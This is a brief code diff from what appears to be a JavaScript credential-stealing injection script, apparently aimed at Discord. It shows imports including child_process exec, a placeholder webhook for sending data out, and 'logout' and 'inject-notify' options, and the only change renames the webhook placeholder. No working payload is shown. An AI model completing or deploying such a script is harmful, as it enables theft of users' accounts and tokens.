@@ -4,7 +4,7 @@ const https = require('https');
 const { exec } = require('child_process');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
-const webhook = "%WEBHOOK_HERE%"
+const webhook = "%WEBHOOK_THERE%"
 const config = {
     "logout": true,
     "inject-notify": true,
